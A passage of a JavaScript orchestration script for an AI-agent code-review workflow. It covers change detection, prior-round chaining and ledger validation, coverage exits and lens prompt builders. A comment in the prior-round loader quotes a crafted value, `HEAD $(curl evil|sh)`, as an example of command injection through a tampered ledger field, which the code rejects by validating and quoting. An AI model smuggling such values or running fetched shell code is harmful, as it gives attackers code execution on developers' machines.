4. Capture \`branch\` = \`git rev-parse --abbrev-ref HEAD\` (empty string if detached) and \`head\` = \`git rev-parse --short HEAD\` (empty string if not a git repo). These two are a FALLBACK only: the logger reads both off the working copy with git at the moment a record is written, and its values win. Do not work to fill them — an empty string is a fine answer.
Return baseRef (the ref you resolved, empty string if none), files (the changed paths), spec (the verbatim description), branch, and head.`,
    { label: 'detect', schema: DETECT_SCHEMA, model: 'haiku', effort: 'low' },
  )
  // If base resolution died even after the retry, say so loudly — falling through would
  // produce a misleading "Approve — no supported language" on an empty file list.
  if (!detected) return { exit: await detectDiedExit(), detected: null }
  return { exit: null, detected }
}
const detection = await detectChanges()
if (detection.exit !== null) return detection.exit
const detected = detection.detected
/** What the detect agent resolved, normalised: the base, the changed files, the spec and the run's identity. @param {DetectAnswer} detected */
function detectedChange(detected) {
  const baseRef = detected.baseRef ?? baseArg
  // DECODED HERE, at the source, before anything asks what a file is. The list comes back as git
  // printed it, and git C-quotes any name holding a space or a non-ASCII character — so the string
  // ends in `"`, `detect` sees no `.rs` suffix, the shared-suffix test sees no `.lock`, and the file
  // belongs to no profile and enters no slice. Decoding it further downstream, at the point the
  // pathspec is rendered, was the first attempt and it could never fire: the name had already been
  // filtered out. Normalising once here also corrects which profiles are considered active and which
  // files are reported as covered by none.
  const changedFiles = (Array.isArray(detected.files) ? detected.files : []).map(decodeGitPath)
  // The authors' OWN written spec (PR body/title or commit messages) — checked claim-by-claim
  // against the code by the intent lens. The one-line inferred `intent` is not enough: precise
  // claims ("never fails on X", "the only way to Y", "idempotent no-op") live in the full body.
  const spec = (typeof detected.spec === 'string' ? detected.spec : '').slice(0, 4000)
  // The detect agent runs `git rev-parse --abbrev-ref HEAD`, which prints the literal string "HEAD" on
  // a DETACHED HEAD — a non-branch. Route it through the same rule gitIdentity applies (branchFromAbbrevRef,
  // inlined above from lib/run-record.mjs) so a detached run resolves to '' BEFORE this value becomes both
  // the record branch (below) and the prior-round `--branch` flag: a non-empty "HEAD" would pass the
  // no-branch guard and wrongly chain unrelated detached contexts to each other (realm @nick/craft #104).
  const branch = branchFromAbbrevRef((typeof detected.branch === 'string' ? detected.branch : '').trim())
  const head = (typeof detected.head === 'string' ? detected.head : '').trim()
  return { baseRef, changedFiles, spec, branch, head }
}
const { baseRef, changedFiles, spec, branch, head } = detectedChange(detected)

// No priorDecisions passed: ONE read-only agent recalls them through the craft:memory skill for the
// diff's paths (realm @nick/craft, node #203); its answer is parsed like a passed list.
async function recallMemory() {
  if (memory.source !== 'none' || !changedFiles.length) return
  const r = await recallDecisions(p => ragent(p, { label: 'memory-recall', phase: 'Scout', schema: MEMORY_RECALL_SCHEMA, effort: 'low' }), changedFiles, baseRef || '')
  priorDecisionsIn = parsePriorDecisions(r.decisions)
  memory = acceptedMemory(r.memory, priorDecisionsIn.decisions.length)
  for (const x of priorDecisionsIn.refused) log(`⚠️ priorDecisions: ${x}`)
}
await recallMemory()

// Round detection: find the newest prior `review` run for this branch, and accept it as the prior
// round ONLY if its head is an ANCESTOR of the current HEAD (a rebase/force-push makes a stale run
// non-ancestor → treat as a fresh first review). `fresh` skips the whole mechanism.
//
// The gate is `!freshArg` ALONE — it used to also require `branch && head`, both of which come from
// the `detect` agent's answer above. That made the whole re-review memory conditional on a model
// filling two fields: a `detect` agent that died or answered without them skipped the read entirely
// and the run reported as a first review, indistinguishable from a genuine one. The script reads the
// branch off git itself now (`prior-round` prefers git over `--branch`), so the flag below is the
// fallback, not the key.
//
// It is NOT `!freshArg` alone, and the second clause is a decision rather than a guard restored.
// The chain is keyed on (project, branch), and `rust-audit` fans out one nested `review` per crate
// through `parallel`: concurrent siblings share both keys. Unconditional entry put them all on one
// chain — each reading whichever sibling filed last as its own previous round and inheriting another
// crate's ledger. A per-crate child is one slice of its parent's single pass, not a round of its
// own, so it does not enter the chain: not as a reader (here) and not as a candidate
// (`selectPriorRounds` skips `nested` rows). The run that has a history is the top-level one.
// Unlike the condition this replaces, the skip is announced — a silent skip was that defect.
// The prior round as the loader read it, hardened, with the reason it was not chained when it was not.
async function loadPriorRound() {
  /** @type {PriorRound | null} */
  let priorRound = null
  // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
  // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
  // as "chained"). fresh and nested never look up a prior round, so they are their own reasons — not
  // "chained", and not the detached-HEAD footgun either (realm @nick/craft #104).
  /** @type {string | null} */
  let priorReason = freshArg ? 'fresh' : viaArg ? 'nested' : null
  if (!freshArg && viaArg) {
    log(`Nested run (via ${viaArg}) — the round chain is the top-level run's: not read, and this run's row is not a candidate round for anyone (its siblings in the fan-out share this project and branch)`)
  }
  if (!freshArg && !viaArg) ({ priorRound, priorReason } = await readPriorRound(priorReason))
  announcePriorRound(priorRound)
  return { priorRound, priorReason }
}
/** @param {string | null} priorReason @returns {Promise<{ priorRound: PriorRound | null, priorReason: string | null }>} */
async function readPriorRound(priorReason) {
  // The loader's throw, held apart from its answer so `priorRound` is only ever an answer or null.
  let priorReadThrew = ''
  /** @type {PriorRound | null} */
  let priorRound = await ragentQuietly(
    `You are the craft prior-round loader. This is mechanical IO — you DECIDE nothing: selecting the round, checking ancestry and reading the record are all done by the script.

Run exactly this:

\`\`\`
${loggerPreludeNow()}cd ${shq(repoArg || '.')} && node ${LOGGER_PATH} prior-round --branch ${shq(branch)} \${CLAUDE_CODE_SESSION_ID:+--session "$CLAUDE_CODE_SESSION_ID"} --project "$PWD"
\`\`\`

It prints ONE line of JSON and always exits 0. Return that object VERBATIM — copy the \`ledger\` array byte for byte, do not summarize, re-key, truncate or "clean up" any entry. It prints \`ledgerCount\` alongside \`ledger\` — copy that number EXACTLY as printed; never recount, never adjust it to the array you are returning. Copy \`sameFpBasis\` exactly as printed too — it decides whether this round may compare fingerprints with the last one, and a dropped or flipped value loses the loop's memory. If the printed object has no \`sameFpBasis\`, leave it out; never invent one. The same holds for \`fpBasisKnown\`, \`priorFpRevisions\` (copy that array exactly) and \`priorFpRevisionsCheck\`. If the command prints nothing or cannot run, return {found:false, round:0, head:"", ledger:[], ledgerCount:0, priorFindings:0, journalSourced:false, sameFpBasis:false, fpBasisKnown:false, reason:"loader-did-not-run"}.`,
    { label: 'prior-round', schema: PRIOR_ROUND_SCHEMA, model: 'haiku', effort: 'low', phase: 'Scout' },
  ).then(res => { const { answer, threw } = splitThrew(res); priorReadThrew = threw; return answer })
  // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
  // command replaced: the first re-review of a branch whose rows predate the absolute-path key
  // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
  if (!priorRound?.['found']) {
    priorReason = rejectedPriorReason(priorRound, priorReadThrew)
    priorRound = null
  }
  // Harden the model-authored ledger `head` at the LOAD boundary before it ever reaches a shell
  // command (it is interpolated into the carry/adjudicate `git diff <head>...HEAD`). If it is not a
  // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
  // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
  // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
  if (priorRound && !isCommitish(priorRound['head'])) {
    log(`⚠️ prior-round head ${JSON.stringify(priorRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
    priorRound['head'] = baseRef
  }
  return { priorRound, priorReason }
}
// Why there is no prior round, logged; a read that failed (rather than found nothing) is a lost record.
/** @param {PriorRound | null} priorRound @param {string} priorReadThrew */
function rejectedPriorReason(priorRound, priorReadThrew) {
  // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
  // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
  const priorReason = priorRound?.['reason'] || 'no-prior-round'
  if (priorRound?.['reason']) log(`No prior round: ${priorRound['reason']}`)
  notePriorReadFailure(priorRound, priorReadThrew)
  return priorReason
}
/** @param {PriorRound | null} priorRound @param {string} priorReadThrew */
function notePriorReadFailure(priorRound, priorReadThrew) {
  // A read that FAILED is the same lost-record class as a write that failed, and its silence is
  // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
  // track is skipped) and the report cannot be told apart from a genuine first pass.
  // Narrow on purpose: the loader tells "there IS no prior round" (no-candidate-rows, no-branch, an
  // ancestry rejection after a rebase — health, and the common case: every first review) apart from
  // "the read could not run". Only the latter is a lost record; marking the former would fire the
  // marker on every first review, which is precisely how a marker stops being read.
  const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
  const readFailed = !priorRound || !!priorReadThrew || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRound)['reason'] || '').startsWith(r))
  if (readFailed) {
    noteTelemetryLoss('the prior-round ledger', priorReadThrew || priorRound?.['reason'] || 'the loader agent returned no result')
  }
}
/** @param {PriorRound | null} priorRound */
function announcePriorRound(priorRound) {
  // Transport integrity: assert the ledger we received is the ledger the script printed.
  if (priorRound && ledgerTruncated(priorRound)) {
    log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound['ledgerCount']} entr(ies), ${priorRound['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
  }
  if (priorRound) log(`Re-review: prior round ${priorRound['round']} @ ${flattenField(priorRound['head'])} · ${priorRound['ledger']?.length || 0} ledger finding(s)`)
  else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
}
const { priorRound, priorReason } = await loadPriorRound()

// realm @nick/craft #104: whether re-review memory engaged, and the note for the one case that fails
// silently — a detached HEAD, where the lookup returns 'no-branch' and the run degrades to round 1
// with no chaining. Recorded on the run record (reReview) and, when the note is set, shown at the top
// of the user-facing report via reReviewMemorySection(). Derived once here, near the round it explains.
const reReview = reReviewMemory(priorReason)
function applyReReviewNote() {
  if (reReview.note) {
    reReviewMemoryNote = reReview.note
    log(`⚠️ ${reReview.note}`)
  }
}
applyReReviewNote()

// Re-review coverage guards (see ledgerDegraded / shouldFullRescan). thisRound is the round number we
// are about to record; reused for the record below.
//
// CONCURRENCY ASSUMPTION, STATED RATHER THAN LOCKED. Deriving the round is a read-modify-append on the
// shared per-(project,branch) store with no lock: this run read the latest prior round above and will
// append round `thisRound`. It assumes no OTHER non-nested review of this same (project,branch) is
// advancing the chain at the same time. The engine's own only source of same-branch concurrency —
// `rust-audit`'s per-crate fan-out — is already excluded from the chain on both ends (`nested` rows are
// skipped as candidates in selectPriorRounds and as readers above), so what remains is an EXTERNAL act:
// two top-level reviews of one branch dispatched at once. That is outside the engine's serialization
// contract, and deliberately not guarded here — a per-branch lock is disproportionate to the cost. If
// it does happen, both compute the same `thisRound` and both append; selection then takes the later ts
// and the loser's ledger is orphaned. Live findings recover on the next full rescan; the one casualty
// with no recovery path is the loser's monotonic tombstone set. This is an accepted, bounded loss, not
// corruption — recorded here so the next reader meets the assumption before the store, not after.
const thisRound = roundNumber()
function roundNumber() {
  return priorRound ? (priorRound['round'] || 1) + 1 : 1
}
// The prior round's finding fingerprints are comparable to this round's
// only when both were fingerprinted under the same basis (FP_BASIS_SINCE in lib/run-record.mjs — a
// separate question from the engine revision, so a telemetry-only bump keeps it; realm @nick/craft
// #108). The ENGINE decides it (below) from the raw revisions the loader hands over; the loader's own
// `sameFpBasis` is only the fallback for a loader older than that field. Only an explicit "same basis"
// is comparable; anything that is not established fails closed. When it is a known different basis —
// the first re-review after a fingerprint-basis change — the tombstone recidivism check is skipped for
// that one transition rather than comparing hashes across incompatible bases and missing a regression
// silently (see the recidivism block and the tombstone assembly; the memory rebuilds from this round on).
// The basis verdict is decided HERE, by the engine that computes the fingerprints, with its own
// inlined table (realm @nick/craft #111): from the raw revisions the loader hands over. A loader that
// predates that field still sends its own verdict, and that is used then.
// The relayed array crosses a model; the loader prints the same list as a string next to it
// (`priorFpRevisionsCheck`). The engine trusts the array only when the two still match — an invented []
// or a truncated or swapped list does not — and otherwise fails closed, reporting a transport loss
// (priorBasisMismatch). When the array arrived intact, THIS engine's table decides, whatever the
// logger's own table said (realm @nick/craft #111).
const relayedVerdict = relayedVerdictOf()
function relayedVerdictOf() {
  return priorRound && typeof priorRound['sameFpBasis'] === 'boolean'
    ? { sameFpBasis: priorRound['sameFpBasis'], fpBasisKnown: priorRound['fpBasisKnown'] } : null
}
const relayedRevisions = relayedRevisionsOf()
function relayedRevisionsOf() {
  return priorRound && Array.isArray(priorRound['priorFpRevisions']) ? priorRound['priorFpRevisions'] : null
}
const relayedCheck = relayedCheckOf()
function relayedCheckOf() {
  return priorRound && typeof priorRound['priorFpRevisionsCheck'] === 'string' ? priorRound['priorFpRevisionsCheck'] : null
}
// A new loader prints BOTH fields on every path; an older one prints neither. So: an array whose check
// no longer matches, or a check with no array, is a transport loss. An EMPTY array whose '' check the
// relay dropped is not — that is an honest "nothing established", and the absent check reads as ''.
const priorBasisMismatch = basisMismatchOf()
function basisMismatchOf() {
  return !!priorRound && (relayedRevisions
    ? (relayedCheck ?? (relayedRevisions.length ? null : '')) !== relayedRevisions.join(',')
    : relayedCheck !== null)
}
const engineFromRevisions = engineBasisOf()
function engineBasisOf() {
  return !priorBasisMismatch && relayedRevisions ? basisVerdictFromRevisions(relayedRevisions) : null
}
// Where the engine's verdict departs from the logger's own, the engine wins (it computes the
// fingerprints) — said in the log and on the record, so skew between the two tables can be counted.
const basisOverridesLogger = basisOverridesLoggerOf()
function basisOverridesLoggerOf() {
  return !!(engineFromRevisions && relayedVerdict
    && (engineFromRevisions.sameFpBasis !== relayedVerdict.sameFpBasis || engineFromRevisions.fpBasisKnown !== relayedVerdict.fpBasisKnown))
}
function logBasisRelay() {
  if (priorBasisMismatch) log(`⚠️ prior-round revisions arrived altered (list ${JSON.stringify(relayedRevisions)}, check ${JSON.stringify(relayedCheck)}) — the fingerprint basis is treated as unknown`)
  if (basisOverridesLogger) log(`Re-review: this engine's fingerprint-basis verdict on revisions ${JSON.stringify(relayedRevisions)} (${JSON.stringify(engineFromRevisions)}) overrides the logger's (${JSON.stringify(relayedVerdict)}) — their tables differ`)
}
logBasisRelay()
const priorBasis = priorBasisOf()
function priorBasisOf() {
  return !priorRound ? null
    : priorBasisMismatch ? { sameFpBasis: false, fpBasisKnown: false }
      : engineFromRevisions || relayedVerdict
}
const priorFpComparable = fpComparableOf()
function fpComparableOf() {
  return priorBasis ? priorBasis.sameFpBasis === true : false
}
// What the basis verdict actually was, and how many carried tombstones it cost — on the run record, so
// whether a revision bump kept every loop's memory (realm @nick/craft #108) is measurable from the
// store rather than only readable in one run's log. Set where the tombstones are dropped.
// 'unknown' is a verdict of its own: the loader answered "not comparable" without establishing that
// the prior's basis is a KNOWN different one (a recovered round whose checkpoints do not attest to one
// known basis, an unreadable round, a record it cannot place, or an answer whose fpBasisKnown was not
// carried) — not a basis change, and reported as lost memory
// (realm @nick/craft #110). Only an explicit fpBasisKnown: true makes "not comparable" a basis change.
const priorBasisVerdict = basisVerdictOf()
function basisVerdictOf() {
  return !priorBasis ? 'absent'
    : (priorBasis.sameFpBasis === false && priorBasis.fpBasisKnown !== true) ? 'unknown'
      : priorBasis.sameFpBasis
}
let tombstonesDroppedForBasis = 0
const priorLedgerDegraded = ledgerDegraded(priorRound)
function warnLedgerDegraded() {
  if (priorLedgerDegraded) {
    log(`⚠️ Re-review DEGRADED: prior round ${/** @type {PriorRound} */ (priorRound)['round']} reported ${/** @type {PriorRound} */ (priorRound)['priorFindings']} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
  }
}
warnLedgerDegraded()
// Distinct from `priorLedgerDegraded`: the ledger itself is fine here, but a journal-reconstructed
// round's `head` is the commit the DEAD run stalled on, which the operator typically re-runs against
// BEFORE making any fix — so it can equal the current HEAD and a delta scan would review nothing.
const priorRoundJournalSourced = journalSourcedOf()
function journalSourcedOf() {
  return Boolean(priorRound?.['journalSourced'])
}
function warnJournalSourced() {
  if (priorRoundJournalSourced) {
    log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${/** @type {PriorRound} */ (priorRound)['round']}'s head ${flattenField(/** @type {PriorRound} */ (priorRound)['head'])} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
  }
}
warnJournalSourced()
const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced })
// On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
// regressions the fixes introduced. But every `fullEvery`-th round (and whenever the prior ledger is
// degraded, or the prior round came from a stalled run's journal) we widen back to the FULL
// base...HEAD diff so a defect an earlier round missed in code it never touched is re-discovered.
// `fresh` (priorRound=null) always keeps the full base...HEAD scan.
const lensBase = lensScope()
// The base the lenses diff against, logged on a re-review with whether this round is a full re-scan.
function lensScope() {
  const lensBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
  if (priorRound) {
    log(`Re-review round ${thisRound} lens scope: ${fullRescan
      ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}${priorRoundJournalSourced ? ', prior round journal-sourced' : ''}) — earlier misses in untouched code are re-checked`
      : `incremental delta ${flattenField(priorRound['head'])}...HEAD (fix commits only)`}`)
  }
  return lensBase
}

// Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
// the detector missed (best-effort detection), honor the pin. An unknown pin id is an ERROR (it used
// to be dropped by `filter(Boolean)`), and a diff no profile covers is INCOMPLETE, never an Approve.
const { pinned: pinnedLangs, unknown: unknownLangs } = resolveProfilePin(PROFILES, requestedLangs)
async function unknownPinExit() {
  const msg = unknownPinMessage(PROFILES, unknownLangs)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (unknown language pin)', findings: summarizeFindings([]), dimensions: [], verification: null,
    notRun: [`nothing ran — ${msg}`, ...scopeNotRun], outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⛔ INCOMPLETE — ${msg}. NOTHING WAS REVIEWED; fix the \`languages\` argument and re-run.`].join('\n') + scopeSection())
}
const detectedActive = Object.values(PROFILES).filter(p => (!pinnedLangs || pinnedLangs.includes(p.id)) && p.detect(changedFiles))
// ORDER IS LOAD-BEARING, and it lives in resolveCoverage: the guards are decided from
// `changedFiles`, BEFORE the pin fallback may populate `active`. The fallback used to run first,
// and since every internal caller (rust-review, nix-review, both rust-audit dispatches) pins a
// language, `active` was never empty and the whole guard block below was dead code on exactly the
// paths that matter: a rust-audit over a diff that resolved empty ran the full lens pipeline over
// nothing and returned a bare `✅ Approve — no findings across rust`.
const coverage = resolveCoverage({ profiles: PROFILES, changedFiles, detectedActive, pinnedLangs })
const active = coverage.active
// The coverage decision's early exits: an empty diff, nothing reviewable, or no profile for what changed.
async function coverageExit() {
  if (coverage.outcome === 'empty') return emptyDiffExit()
  if (coverage.outcome === 'nothing-to-review') return nothingToReviewExit()
  if (coverage.outcome === 'no-profile') return noProfileExit()
  return null
}
async function emptyDiffExit() {
  const emptyMsg = noChangedFilesMessage()
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (empty diff)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: [], notRun: [emptyMsg, ...scopeNotRun], outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `⚠️ INCOMPLETE — ${emptyMsg}`,
    ``, `## Detected`, detected?.notes || `0 changed file(s) against ${baseRef || 'HEAD'}`,
  ].join('\n') + scopeSection())
}
async function nothingToReviewExit() {
  // Nothing was reviewed AND nothing needed reviewing — an honest green, not a coverage hole. A
  // marker that fires on every README-only change stops being read.
  const okMsg = nothingToReviewMessage(changedFiles.length)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'Approve (nothing to review)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: changedFiles, notRun: [...scopeNotRun], outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `✅ Approve (NOTHING TO REVIEW) — ${okMsg}`,
    ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`),
  ].join('\n') + scopeSection())
}
async function noProfileExit() {
  const msg = noLanguageMessage(PROFILES, changedFiles.length, coverage.material.length)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null,
    languages: [], verdict: 'INCOMPLETE (no language profile)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: changedFiles, notRun: [msg, ...scopeNotRun], outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `⚠️ INCOMPLETE — ${msg}`,
    ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n') + scopeSection())
}
// An unknown language pin first: it stops the run before any profile is activated.
const languageStop = unknownLangs.length ? await unknownPinExit() : await coverageExit()
if (languageStop !== null) return languageStop
function logActiveProfiles() {
  log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinned: ${pinnedLangs.join(',')})` : ''} · base ${baseRef || 'HEAD'}`)
}
logActiveProfiles()

// Changed files no active profile covers are NOT reviewed — say so instead of silently shrinking scope.
// The ones that are a real coverage gap (see coverageGapFiles: material AND not project config)
// additionally reach the verdict further down, so it carries the (INCOMPLETE) marker rather than a
// bare Approve.
const uncoveredFiles = changedFiles.filter((/** @type {string} */ f) => !active.some(p => p.detect([f])))
const uncoveredGap = coverageGapFiles(uncoveredFiles)
function logUncoveredFiles() {
  if (uncoveredFiles.length) log(`Outside all active profiles (not reviewed): ${uncoveredFiles.join(', ')}${uncoveredGap.length ? ` — ${uncoveredGap.length} unreviewed source file(s)` : ' (docs/assets/lockfiles/project config only — not a coverage gap)'}`)
}
logUncoveredFiles()

// ================= Prompt builders (profile-parameterized) =================
/** @param {Profile} profile */
function scoutPrompt(profile) {
  return `You are scouting a ${profile.lang} diff to plan an elastic review. Use shell + read only — do NOT review yet.${pathArg ? `\n\nSCOPE: review ONLY the crate/dir at \`${flattenField(pathArg)}\`. Pass \`-- ${shq(pathArg)}\` to every \`git diff\` command below.` : ''}

Diff base: ${lensBaseLabel()}. Consider only this profile's files (${profile.diffGlobs.join(' ')}).
1. Inspect \`git diff --stat ${lensBase ? `${shq(lensBase)}...HEAD` : 'HEAD'} -- ${profile.diffGlobs.join(' ')}\`. Set sizeBucket:
   small = a few files / < ~80 changed lines; large = many files / > ~400 lines or a public-API-heavy change; medium otherwise.
2. lenses: choose from ${JSON.stringify(profile.lenses)}.
   - small: only the touched categories (minimum 2; always include the dominant category, and include '${profile.safetyLens}' unless the diff clearly touches nothing related to ${profile.securityHints}).
   - medium: the categories plausibly in play.
   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter((/** @type {string} */ l) => CONDITIONAL_LENSES.includes(l)))} — the
     engine adds those itself off a code signal in the diff, so picking one here only pays for an
     agent the signal did not ask for. Do not count them toward your choices.
   ${profile.scoutRules}${strict ? '\n   STRICT MODE is on: ALWAYS include \'maintainability\' in lenses regardless of size.' : ''}
3. isLibrary: ${profile.usesLibrary ? 'true if this is a published library (has `[lib]`/looks publishable) — best effort.' : 'always false (not applicable to this language).'}
4. securitySensitive: true if the diff touches ${profile.securityHints}.
5. intent: ${intentArg ? `the caller provided: "${intentArg}". Refine it from the diff if needed.` : 'infer the change\'s purpose from the diff and any PR/commit messages; empty string if unclear.'}
6. churn: list up to 5 files in the diff that git shows as frequently changed (\`git log --oneline -n 50 -- <file> | wc -l\` is a rough proxy). May be empty.
7. surfaces: classify what the diff TOUCHES so the engine can skip a whole-repo lens whose defect class this diff cannot exhibit. Answer CONSERVATIVELY — if unsure, OMIT the field (or the individual key), or set it true; NEVER guess false. A false you are not sure of silences a lens.
   - crossBoundarySymbol: does the diff change the signature/shape of an exported/\`pub\` symbol that unchanged code depends on?
   - wireForm: does it change a contract that a party running ANOTHER version reads, calls or deploys against — a CRD schema or API version list, a serde type, an HTTP/OpenAPI shape, a protocol, a CLI flag / exit code / output format, a config key, an env var, a Helm value, a default, a renamed exported name?
   - invariantType: does it change a type that carries an invariant other code relies on?`
}

/** @param {string} priorSummary @param {Profile} profile @param {Plan} plan */
function negativeSpacePrompt(priorSummary, profile, plan) {
  const intent = plan?.intent ?? intentArg
  return `You are the **negative-space** review lens for a ${profile.lang} change. Unlike the other lenses, your job is NOT to review the changed lines — it is to find the bug the diff ENABLES in code it did NOT touch. ${profile.navSkill ? `Load the ${profile.navSkill} skill for whole-repo search; use` : 'Use'} Grep/Glob across the ENTIRE tree, not just the diff.

Diff base: ${lensBaseLabel()}.
${intent ? `INTENT (what the change should do): ${intent}` : ''}
${plan?.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — an invariant the author claims here may be broken by the UNCHANGED code you inventory below):\n"""\n${plan.spec}\n"""` : ''}

METHOD — follow in order:
1. Inventory the NEW surface the diff introduces. Read the FULL diff: \`git diff ${lensDiffRange()}\`. List every new: ${profile.lang === 'Nix' ? 'flake output / module option / package attr / overlay / renamed binding' : 'enum variant / status value / DB column / table / migration / public fn / route / struct field'}. ALSO list any UNCHANGED definition the diff now references or relies on for the first time.
2. For EACH item, Grep the UNCHANGED tree for existing code that reads, references, ${profile.lang === 'Nix' ? 'imports, or overrides' : 'lists, updates, deletes, cascades, serializes, orders, or authorizes'} that shape. Ask: does this pre-existing path violate an invariant the change assumes?
3. Report each concrete violation ANCHORED TO THE UNCHANGED file:line that is actually wrong, not the diff line. That anchor is real — cite it precisely so it can be verified.

Only report a violation you can name a concrete reachable path for. Put the triggering surface in \`blastRadius\`; in \`why\`, state the invariant and the exact old path that breaks it. Do NOT restate findings already in the ALREADY-FOUND set below — look for what they MISSED.

ALREADY-FOUND (from other lenses / earlier rounds — do not repeat):
${priorSummary}

Return {lens: "negative-space", findings: [...]} using the shared finding schema. Set \`ruleId\` to the matching ${profile.rubricSkill} rules.md ID or "" if none fits. Observability: the workflow records this run — do NOT write your own record.`
}

/** The diff base as the lens prompts name it. */
function lensBaseLabel() {
  return lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes / most recent commit'
}

/** The `git diff` range argument the lens prompts hand the agent. */
function lensDiffRange() {
  return lensBase ? `--merge-base ${shq(lensBase)}` : 'HEAD'
}

/** @param {Slice | null} slice @param {Profile} profile */
function lensPathspec(slice, profile) {
  return slice ? slice.files.map(pathspecLiteral).filter(Boolean).map(shq).join(' ') : profile.diffGlobs.join(' ')
}

/** @param {string} lens */
function strictMaintainabilityLine(lens) {
  return strict && lens === 'maintainability' ? '\nSTRICT MODE: apply the maintainability bar as a *presumption of block* — each maintainability issue is a blocker unless the author clearly justified it in the diff or brief. Be harsh, but stay grounded — every finding still needs a concrete cited file:line and survives refutation; do not invent issues.\n' : ''
}

/** @param {Slice | null} slice */
function sliceBlock(slice) {
  return slice ? `YOUR SLICE: \`${slice.key}\` — ${slice.files.length} changed file(s) of a larger diff. Sibling lenses hold the rest, and overlapping findings are de-duplicated downstream.
This bounds WHAT YOU JUDGE, never what you may READ: trace definitions, uses and consumers anywhere in the repository, and pin every off-site premise in \`whereChecked\` exactly as usual. A defect whose evidence sits outside your slice is still yours to report if it is CAUSED by a line in your slice — say so in \`why\`. A defect located in another slice is not yours; do not report it.
EFFICIENCY: pull your slice's diff ONCE, in one command. Do not re-run broad searches over the whole tree — every turn re-reads everything already in your context, so a wide grep is paid for again on each turn that follows it.` : ''
}

/** The re-review framing of a lens prompt, empty on a first round. */
function reReviewBlock() {
  return priorRound ? (fullRescan
  ? `RE-REVIEW (full re-scan): review the WHOLE diff (base ${flattenField(lensBase)}...HEAD), not just the latest fixes — an earlier round may have missed a defect in code it did not touch. Prior findings are adjudicated separately and any you re-surface are de-duplicated downstream, so spend your effort on defects that are NOT already obviously known.`
  : `RE-REVIEW: you are reviewing ONLY the fix commits since the prior round (base ${flattenField(lensBase)}). Prior findings are adjudicated separately — do not re-report them; surface only NEW defects the fixes introduced.`) : ''
}

/** @param {Plan} plan */
function lensPlanLines(plan) {
  return `${plan.intent ? `INTENT (what the change should do): ${plan.intent}` : ''}
${plan.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — treat as the spec; the intent lens must check EACH claim against the code, and any lens may use it):\n"""\n${plan.spec}\n"""` : ''}
${plan.churn?.length ? `HOT FILES (scrutinize harder): ${plan.churn.join(', ')}` : ''}`
}

/** @param {Profile} profile @param {string} lens @param {Plan} plan */
function mutantsLine(profile, lens, plan) {
  return profile.id === 'rust' && lens === 'tests' && (plan.sizeBucket === 'medium' || plan.sizeBucket === 'large') ? 'If `cargo mutants` is installed, you MAY run it time-boxed on the changed files to surface contracts no test would catch a regression on; skip silently if absent.' : ''
}

// Where a lens reads its catalogue. Lenses run as the reviewer agent, which has no Skill tool, so
// naming a skill reached nothing; the file is located the way the logger is (an explicit craftRoot,
